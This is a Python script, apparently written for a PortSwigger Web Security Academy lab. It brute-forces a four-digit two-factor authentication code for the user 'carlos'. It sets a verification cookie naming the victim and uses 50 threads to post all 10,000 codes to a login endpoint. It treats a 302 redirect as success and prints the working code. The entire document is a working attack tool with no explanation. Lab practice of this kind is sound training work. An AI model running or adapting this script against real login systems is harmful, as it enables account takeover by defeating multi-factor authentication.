import time
import requests
import threading
from queue import Queue

server_name = "0a3c00a4034b2b4080610d90003c0046"
base_url = f"https://{server_name}.web-security-academy.net"
url = f"{base_url}/login2"
success = ''

headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "Cookie": "verify=carlos",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": base_url,
    "Referer": f"{base_url}/login2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

requests.get(url, headers=headers, allow_redirects=False)

queue = Queue()
found = threading.Event()

def worker():
    while not queue.empty() and not found.is_set():
        temp_mfa = queue.get()
        data = {"mfa-code": temp_mfa}

        try:
            start_time = time.time()
            response = requests.post(url, headers=headers, data=data, allow_redirects=False)
            elapsed_time = time.time() - start_time

            if response.status_code == 302:
                found.set()
                time.sleep(2)
                print(f"\n[*] MFA Code Found: {temp_mfa} | Time: {elapsed_time:.4f} sec")
                for key, value in response.headers.items():
                    print(f"{key}: {value}")
                break
            else:
                print(f"[-] Tried {temp_mfa} | Response: {response.status_code} | Time: {elapsed_time:.4f} sec")

        except Exception as e:
            print(f"[!] Error with {temp_mfa}: {e}")
            queue.put(temp_mfa)

        queue.task_done()

def main():
    for i in range(10000):
        queue.put(str(i).zfill(4))

    threads = []
    for _ in range(50):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    queue.join()

    for t in threads:
        t.join()

    if not found.is_set():
        print("[X] No valid MFA code found.")


if __name__ == "__main__":
    main()
